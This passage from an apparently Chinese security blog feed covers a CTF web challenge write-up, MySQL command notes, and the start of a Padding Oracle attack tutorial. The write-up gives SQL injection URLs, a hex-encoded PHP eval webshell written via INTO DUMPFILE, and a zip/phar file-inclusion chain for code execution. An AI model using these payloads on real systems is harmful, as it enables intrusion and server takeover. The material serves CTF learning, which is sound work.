uni&lt;br&gt;on se&lt;br&gt;lect 1,database(),3</div><div class="line">表名：http://10.21.13.152:20002/?id=-1 uni&lt;br&gt;on se&lt;br&gt;lect 1,group_concat(distinct ta&lt;br&gt;ble_name),3 fr&lt;br&gt;om info&lt;br&gt;rmation_schema.columns where ta&lt;br&gt;ble_schema=database()</div><div class="line">列名：http://10.21.13.152:20002/?id=-1 uni&lt;br&gt;on se&lt;br&gt;lect 1,group_concat(distinct column_name),3 fr&lt;br&gt;om info&lt;br&gt;rmation_schema.columns where ta&lt;br&gt;ble_schema=database()and ta&lt;br&gt;ble_name=&apos;flag_here&apos;</div><div class="line">数据：http://10.21.13.152:20002/?id=-1 uni&lt;br&gt;on se&lt;br&gt;lect 1,group_concat(passwdzz),3 fr&lt;br&gt;om flag_here</div></pre></td></tr></table></figure></p><p>因为我题目里用了<code>limit</code>，所以这里最好用<code>group_concat</code>来获得所有数据，然后用<code>distinct</code>来去掉重复的。<br><img src="https://i.imgur.com/gU5ynCX.png" alt=""><br><br></p><h2 id="好心的壮壮–sql4"><a href="#好心的壮壮–sql4" class="headerlink" title="好心的壮壮–sql4"></a>好心的壮壮–sql4</h2><p>这个题目我把源码贴了上去，观察源码可以发现有两个文件，一个是<code>index.php</code>，另一个是<code>include.php</code>。一个注入题为什么要给文件包含的函数呢，这不是明摆着让你们用sql写木马，然后去包含嘛，心塞塞…</p><p>再看<code>index.php</code>，我用每个人的ip来作为目录名创建了一个权限<strong>777</strong>的目录，然后再去进行正常的sql代码(这么明显的提示…)。然后我们还会发现，并没有过滤掉<strong>dumpfile</strong>以及<strong>outfile</strong>以及<strong>into</strong>。现在目标明确，一切就绪，准备用sql语句写个木马吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">post:id=-1 union select 0x3c3f706870206576616c28245f504f53545b22616161225d293b203f3e into dumpfile &apos;/tmp/10.21.107.235/aaa.php&apos;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/K2jl4kN.png" alt=""></p><p>这里有个全场唯一的一个小坑，就是如果你是正常的写’&lt;?php eval($_POST[“aaa”]); ?&gt;’这个一句话木马的话，中间php部分会消失掉，like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">post:id=-1 union select &quot;&lt;?php eval($_POST[&apos;aaa&apos;]); ?&gt;&quot; into dumpfile &apos;/tmp/10.21.107.235/aaa.php&apos;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/zb4z5i1.png" alt=""></p><p>所以，好心的壮壮又给你们个送分，把你们发送过去的东西打印出来。所以我们选择用十六进制来绕过这个坑点。<br>然后用<code>include.php</code>去包含就好了<br><img src="https://i.imgur.com/XXc6qCY.png" alt=""></p><p>然后连菜刀去吧。<img src="https://i.imgur.com/HjaT1Rj.png" alt=""></p><p>随便翻翻目录就可以找到目录<img src="https://i.imgur.com/zG2ebIC.png" alt=""></p><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p>这个题目算是基本套路吧…我提示也是反复强调伪协议，可是最后还是只有master一个队做出来，心塞塞…</p><p>看到<code>url</code>里有个<code>?page</code>，先想到<code>filter</code>伪协议去读源码，然后把所有源码都爬下来之后，主要的几个文件如下:<br>upload.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">&lt;META http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf8&quot;&gt; </div><div class="line"> &lt;?php</div><div class="line"> header(&quot;content-type:text/html;charset=utf-8&quot;);</div><div class="line"> include &apos;config.php&apos;;</div><div class="line"></div><div class="line">function get_random_token()&#123;</div><div class="line">    $random_token = &apos;&apos;;</div><div class="line">    $str = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890&quot;;</div><div class="line">    for($i = 0; $i &lt; 16; $i++)&#123;</div><div class="line">        $random_token .= substr($str, rand(1, 61), 1);</div><div class="line">    &#125;</div><div class="line">    return $random_token;</div><div class="line">&#125;</div><div class="line"></div><div class="line"> if (isset($_POST[&apos;Upload&apos;])) &#123;</div><div class="line">            $target_path =&quot;./Err0r/&quot;;</div><div class="line">            $target_name=get_random_token();</div><div class="line">            $target_path = $target_path . $target_name;</div><div class="line">            $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</div><div class="line">            $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1);</div><div class="line">            $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;]; </div><div class="line"></div><div class="line">            if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;png&quot; || $uploaded_ext == &quot;PNG&quot;|| $uploaded_ext == &quot;gif&quot; || $uploaded_ext == &quot;GIF&quot;|| $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</div><div class="line">                if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path.&quot;.&quot;.$uploaded_ext)) &#123;                   </div><div class="line">                    echo &apos;&lt;pre&gt;&apos;;</div><div class="line">                    echo &apos;Your image was not uploaded.&apos;;</div><div class="line">                    echo &apos;&lt;/pre&gt;&apos;;               </div><div class="line">                  &#125; else &#123;               </div><div class="line">                    echo &apos;&lt;pre&gt;&apos;;</div><div class="line">                    echo $target_path .&quot;.&quot;.$uploaded_ext .&apos; succesfully uploaded!&apos;;</div><div class="line">                    echo &apos;&lt;/pre&gt;&apos;;                    </div><div class="line">                    &#125;</div><div class="line">            &#125;</div><div class="line">            </div><div class="line">            else&#123;        </div><div class="line">                echo &apos;&lt;pre&gt;&apos;;</div><div class="line">                echo &apos;Your image was not uploaded.&apos;;</div><div class="line">                echo &apos;&lt;/pre&gt;&apos;;</div><div class="line">            &#125; </div><div class="line">        &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>include.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"> &lt;META http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf8&quot;&gt; </div><div class="line">&lt;?php</div><div class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</div><div class="line">include &apos;config.php&apos;;</div><div class="line">if (isset($_GET[&apos;page&apos;])) &#123;</div><div class="line">    $page = $_GET[&apos;page&apos;];</div><div class="line"></div><div class="line">&#125; else &#123;</div><div class="line">    $page = &quot;home&quot;;</div><div class="line">&#125;</div><div class="line">$file =   $page . &quot;.php&quot;;</div><div class="line"></div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</div><div class="line">        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</div><div class="line"></div><div class="line">        &lt;title&gt;My PHP Website&lt;/title&gt;</div><div class="line"></div><div class="line">        &lt;link rel=&quot;stylesheet&quot; href=&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot; /&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;nav class=&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt;</div><div class="line">            &lt;div class=&quot;container&quot;&gt;</div><div class="line">                &lt;div class=&quot;navbar-header&quot;&gt;</div><div class="line">                    &lt;button type=&quot;button&quot; class=&quot;navbar-toggle collapsed&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbar&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;navbar&quot;&gt;</div><div class="line">                        &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt;</div><div class="line">                        &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</div><div class="line">                        &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</div><div class="line">                        &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</div><div class="line">                    &lt;/button&gt;</div><div class="line">                    &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Project name&lt;/a&gt;</div><div class="line">                &lt;/div&gt;</div><div class="line">                &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt;</div><div class="line">                    &lt;ul class=&quot;nav navbar-nav&quot;&gt;</div><div class="line">                        &lt;li &lt;?php if ($page == &quot;home&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</div><div class="line">                        &lt;li &lt;?php if ($page == &quot;submit&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=submit&quot;&gt;Submit&lt;/a&gt;&lt;/li&gt;</div><div class="line">                        &lt;li &lt;?php if ($page == &quot;about&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=about&quot;&gt;About&lt;/a&gt;&lt;/li&gt;</div><div class="line">                    &lt;/ul&gt;</div><div class="line">                &lt;/div&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">        &lt;/nav&gt;</div><div class="line"></div><div class="line">        &lt;div class=&quot;container&quot; style=&quot;margin-top: 50px&quot;&gt;</div><div class="line">            &lt;?php</div><div class="line">                include($file);</div><div class="line">                echo $page;</div><div class="line">                echo &quot;||&quot;;</div><div class="line">                echo $file;</div><div class="line">            ?&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;script src=&quot;http://code.jquery.com/jquery-latest.js&quot; /&gt;</div><div class="line">        &lt;script src=&quot;http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js&quot; /&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p><p>可以发现<code>index.php</code>中会将<code>?page</code>参数加上’.php’，然后去包含。然后<code>upload.php</code>，会判断上传的文件的后缀是否为’.jpg’或者’.gif’或者’.png’，如果后缀不对，则会显示上传失败；如果后缀正确，则会在<strong>./Err0r</strong>目录下生成一个文件，文件名为随机生成的十六字节的字符串+’.jpg’，更何况提示也说了有个<code>a.php</code>，我们可以看到<code>phpinfo</code>信息，这个版本的php已经修复了<strong>%00</strong>漏洞，所以在文件名上动手脚什么的已经不太行了。</p><p>这里就需要另外的伪协议了，如<code>zip</code>和<code>phar</code>。<br>我们可以利用这两个伪协议来读取压缩包中的文件，具体说明如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[http://php.net/manual/zh/book.phar.php](http://php.net/manual/zh/book.phar.php)</div><div class="line">[http://php.net/manual/zh/book.zip.php](http://php.net/manual/zh/book.zip.php)</div></pre></td></tr></table></figure></p><p>具体解题如下：</p><ol><li>先写一个php一句话木马，文件名为<code>a.php</code>，内容为<code>&#39;&lt;?php eval($_POST[&quot;aaa&quot;]); ?&gt;&#39;</code></li><li>压缩一下变成<code>a.zip</code>，再更改文件名，将原来的<code>a.zip</code>改为<code>a.jpg</code></li><li>上传<code>a.jpg</code>，通过<code>upload.php</code>的上传验证。</li></ol><p>页面返回文件变换之后保存的路径以及文件名，用以下两个方法去包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://10.21.13.152:20050/?page=zip://./Err0r/RiiwLkgTlLxPRPsE.jpg%23a</div><div class="line">post:aaa=phpinfo();</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://10.21.13.152:20050/?page=phar://./Err0r/RiiwLkgTlLxPRPsE.jpg/a</div><div class="line">post:aaa=phpinfo();</div></pre></td></tr></table></figure><p>然后菜刀连一下。<br><img src="https://i.imgur.com/le9kFIE.png" alt=""></p><p>然后随便翻翻目录就能找到flag<br><img src="https://i.imgur.com/pSB48Lu.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;周末出题老表伤透了心，原本高高兴兴的打算直接用做出来的童鞋的wp，结果发现没人做，还是得自己写…&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="http://Err0rzz.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="http://Err0rzz.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>linux下的mysql使用</title>
    <link href="http://Err0rzz.github.io/2017/11/26/linux%E4%B8%8B%E7%9A%84mysql%E4%BD%BF%E7%94%A8/"/>
    <id>http://Err0rzz.github.io/2017/11/26/linux下的mysql使用/</id>
    <published>2017-11-26T11:18:13.000Z</published>
    <updated>2017-12-26T07:27:44.054Z</updated>
    
    <content type="html"><![CDATA[<p>最近在用docker搭题目，需要使用到mysql，以前在windows下都是用可视化界面，现在用命令行有点不习惯，记录下命令吧。</p><a id="more"></a><p><strong>启动mysql：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service mysql start</div><div class="line">mysql -u root -p password</div></pre></td></tr></table></figure></p><p><strong>退出mysql</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;exit</div></pre></td></tr></table></figure></p><p><strong>修改密码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt;update mysql.user set password=password(&apos;test&apos;) where username=&apos;root&apos;;</div><div class="line">mysql&gt; flush privileges;</div></pre></td></tr></table></figure></p><p>这里记得刷新权限，不然会失败(一开始老是忘了加flush，死活不成功)。</p><p><strong>建数据库</strong><br>创建数据库名为mysql的数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;create database mysql;</div></pre></td></tr></table></figure></p><p><strong>删除数据库</strong><br>删除数据库名为mysql的数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;drop database mysql;</div></pre></td></tr></table></figure></p><p><strong>进入数据库</strong><br>进入数据库名为mysql的数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;use mysql;</div></pre></td></tr></table></figure></p><p><strong>查看所有数据库</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;show databases;</div></pre></td></tr></table></figure></p><p><strong>创建数据表</strong><br>创建表名为users的数据表,字段分别为id(int),username(varchar(20)),password(varchar(50))，主键为id且自增<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;create table users(id int auto_increment,username varchar(20),password varchar(50),primary key(id));</div></pre></td></tr></table></figure></p><p><strong>查看所有表</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;show tables;</div></pre></td></tr></table></figure></p><p><strong>查看某个表</strong><br>查看数据表名users的所有列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;desc users;</div></pre></td></tr></table></figure></p><p><strong>修改表名</strong><br>修改原users名为bbb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;alter table users rename to bbb;</div></pre></td></tr></table></figure></p><p><strong>修改表的列</strong><br>添加列age(int)：<br><code>mysql&gt;alter table users add column age int;</code></p><p>删除列age：<br><code>mysql&gt;alert table users drop column age</code></p><p>修改列属性：<br><code>mysql&gt; alter table users modify age char(10);</code></p><p>删除id自增长：<br><code>mysql&gt;alter table users change id id int;</code></p><p>删除主键：<br><code>mysql&gt; alter table users drop primary key;</code></p><p>修改字段age为不为空：<br><code>mysql&gt; alter table users change age age not null;</code></p><p>添加id为主键，自增长：<br><code>mysql&gt; alter table users modify id int auto_increment primary key ;</code></p><p>设置id默认为0<br><code>mysql&gt; alter table users modify id int default 0 ;</code></p><p><strong>插入数据</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;insert into users (username,password) values(&quot;zz&quot;,&quot;zz_is_handsome&quot;);</div></pre></td></tr></table></figure></p><p><strong>删除数据</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;delete from users where username=&apos;zz&apos;;</div></pre></td></tr></table></figure></p><p><strong>修改数据</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; update users set username=&apos;ZZ&apos; where id=0;</div></pre></td></tr></table></figure></p><p><strong>创建用户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;create user zz identified by &quot;root&quot;;</div></pre></td></tr></table></figure></p><p><strong>删除用户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; drop user zz;</div></pre></td></tr></table></figure></p><p><strong>查看权限</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show grants for zz;</div></pre></td></tr></table></figure></p><p><strong>赋予权限</strong><br>grant和revoke可以在几个层次上控制访问权限<br>1，整个服务器，使用 grant ALL  和revoke  ALL<br>2，整个数据库，使用on  database.*<br>3，特点表，使用on  database.table<br>4，特定的列<br>5，特定的存储过程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; grant select on sql1.* to zz;</div></pre></td></tr></table></figure></p><p><strong>回收权限</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; revoke  select on sql1.*  from  zz;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在用docker搭题目，需要使用到mysql，以前在windows下都是用可视化界面，现在用命令行有点不习惯，记录下命令吧。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Padding_Oracle 攻击</title>
    <link href="http://Err0rzz.github.io/2017/11/23/Padding-Oracle-%E6%94%BB%E5%87%BB/"/>
    <id>http://Err0rzz.github.io/2017/11/23/Padding-Oracle-攻击/</id>
    <published>2017-11-23T05:52:35.000Z</published>
    <updated>2017-11-23T12:42:28.445Z</updated>
    
    <content type="html"><![CDATA[<p>道哥的《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式，据说这货在2011年的Pwnie Rewards上还被评为”最具价值的服务器漏洞”。而且比赛中经常遇到，而且一般都是混在<code>web</code>题里的<code>crypto</code>。</p><a id="more"></a><p><code>PS：ms10-070</code></p><p>适用于<strong>CBC</strong>模式下的<code>AES</code>，<code>DES</code>，<code>3DES</code>等分组密码</p><p>攻击成立的条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1. 攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）</div><div class="line">2. 攻击者能够触发密文的解密过程，且能够知道密文的解密结果</div></pre></td></tr></table></figure></p><p><br></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>尽量去看《白帽子讲web安全》，网上有些讲解原理有些问题，我看了半天才发现，而且后来虽然看懂了，但是代码实现又有些难度，就结合一些题目的wp中别人的代码去理解，然后自己实现一遍之后发现对原理理解更加深刻。</p><h1 id="分组的填充-Padding"><a href="#分组的填充-Padding" class="headerlink" title="分组的填充(Padding)"></a>分组的填充(Padding)</h1><p>分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度:<br><img src="https://i.imgur.com/oFrfAaJ.png" alt=""></p><p>这个时候，普遍的做法是在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差3个字符，则填充0×03。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1个字节的Padding为0x01</div><div class="line">2个字节的Padding为0x02</div><div class="line">3个字节的Padding为0x03</div><div class="line">4个字节的Padding为0x04</div><div class="line">5个字节的Padding为0x05</div><div class="line">6个字节的Padding为0x06</div><div class="line">7个字节的Padding为0x07</div><div class="line">8个字节的Padding为0x08(当原始的明文正好是分组的整数倍的时候，Padding一个整组的填充值)</div></pre></td></tr></table></figure><p>just like:<br><img src="https://i.imgur.com/tEDJE9a.png" alt=""><br>这种Padding原则遵循的是常见的PKCS#5标准</p><p><strong>cbc(Cipher Block Chaining CBC)</strong>模式下加解密：<br><img src="https://i.imgur.com/DYj0ER5.png" alt=""><br><img src="https://i.imgur.com/hjOCP8v.png" alt=""></p><p>这里要注意，前几个分组的解密结果对我们都没有意义，我们重点关注的是最后一个分组的解密结果。看这张图可能会清楚一点:<br><img src="https://i.imgur.com/kTMKZtS.png" alt=""><br><br></p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>在<strong>Padding Oracle Attack</strong>攻击中，攻击者输入的参数是<code>IV+Cipher</code>，我们要通过对IV的”穷举”来请求服务器端对我们指定的Cipher进行解密，并对返回的结果进行判断。 </p><p>当提交参数时，服务端的返回结果会有下面3种情况：</p><ul><li>参数是一串正确的密文，分组、填充、加密都是对的(程序运行本身没出问题)，包含的内容也是正确的(业务逻辑是对的)，那么服务端解密、检测用户权限都没有问题，返回HTTP 200。</li><li>参数是一串错误的密文，包含不正确的bit填充(程序运行本身出现致命错误)，那么服务端解密时就会抛出异常，返回HTTP 500 server error。</li><li>参数是一串正确的密文(程序运行本身没出问题)，包含的用户名是错误的(业务逻辑是错的)，那么服务端解密之后检测权限不通过，但是依旧会返回HTTP 200戒者HTTP 302，而不是HTTP 500。 </li></ul><p>因此慢慢调整IV的值，以此希望解密后，最后一个字节的值为正确的<strong>padding byte</strong>，比如一个0x01。<br><br></p><h1 id="破解密文得到明文"><a href="#破解密文得到明文" class="headerlink" title="破解密文得到明文"></a>破解密文得到明文</h1><p><strong>先爆破出最后字节</strong>：<br>因为<code>Intermediray Value</code>是固定不变的，所以我们可以通过遍历<code>Initialization Vector</code>的最后一个字节(从0x00带0xFF)，有且只有一个的值与<code>Intermediray Value</code>进行XOR后结果是0x01。通过遍历这255个值，我们得到了那个我们所需的IV，<strong>此时解密系统返回的是一个乱码，而不是解密失败，可以根据返回值来确定那个IV。</strong><br><code>PS：下面这图就是我开始说的网上有问题的地方，黄色应该是0x3c,蓝色的地方应该是0x3d,可以参考书本</code><br><img src="https://i.imgur.com/ReYlu4x.png" alt=""><br>然后将我们现在得到的<code>IV</code>与目前填充的值通过XOR运算，我们可以算出<code>Intermediray Value</code>的最后一个字节，根据解密过程，将这个字节和真实的IV最后一个字节XOR，则是明文的最后一个字节~~<br><img src="https://i.imgur.com/slMWJfU.png" alt=""></p><p><strong>爆破倒数第二个字节</strong>：<br>在正确匹配了padding “0x01”后，需要做的是继续推导出剩下的<code>Intermediary Byte</code>。根据padding标准，当需要padding两个字节的时候，其值应该为<strong>0x02,0x02</strong>。而此时我们知道了<code>Intermediary Byte</code>为0x3d，因此我们可以先更新IV的最后一个字节为<strong>0x3d^0x02=0x3f</strong>(这样等会做XOR的时候，最后一位肯定一直为0x02,我们就只需要关注倒数第二位即可)，此时可以开始遍历IV倒数第二个字节了(0x00-0xFF),跟前面步骤一样。</p><p>接下来依次类推，就可以推导出所有<code>Intermediary Byte</code>，我们这时候就完成了不需要密钥来解密爆破得到了明文。<br><br></p><h1 id="构造任意明文对应的密文"><a href="#构造任意明文对应的密文" class="headerlink" title="构造任意明文对应的密文"></a>构造任意明文对应的密文</h1><p>根据上面的解法，我们可以得到<code>Intermediary Value</code>，而在这个前提下，而且我们可以控制IV，所以我们可以通过改变IV来使得XOR的结果为任意明文，还是观察这张图：<br><img src="https://i.imgur.com/SIUNy2R.png" alt=""></p><p>对于多个分组的密文来说，从最后一组密文开始往前推。以两个分组为例，当我们推出第二个分组的IV(我们通过改变IV来改变解密出来的明文)，而此时这个IV是第一个分组的密文，所以我们需要将这个IV作为第一个分组的密文再进行推导。<br><br></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>虽然上面的原理理解起来不难，但是具体情境中代码实现起来还是挺难的，所以还是用例题来详细说明吧</p><h1 id="is-aes-secure"><a href="#is-aes-secure" class="headerlink" title="is_aes_secure"></a>is_aes_secure</h1><p>题目是第三届上海市网络安全大赛的题目，题目源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/ruby -w</div><div class="line">require &apos;openssl&apos;</div><div class="line">require &apos;base64&apos;</div><div class="line"></div><div class="line">def banner()</div><div class="line">    puts &apos; ____________________________________________&apos;</div><div class="line">    puts &apos;|                                            |&apos;</div><div class="line">    puts &apos;| Welcome to our secure communication system |&apos;</div><div class="line">    puts &apos;| Our system is secured by AES               |&apos;    </div><div class="line">    puts &apos;| So...No key! No Message!                   |&apos;</div><div class="line">    puts &apos;|____________________________________________|&apos;</div><div class="line">    puts &apos;&apos;</div><div class="line">end</div><div class="line"></div><div class="line">def option()</div><div class="line">    puts &apos;1. Get the secret message.&apos;</div><div class="line">    puts 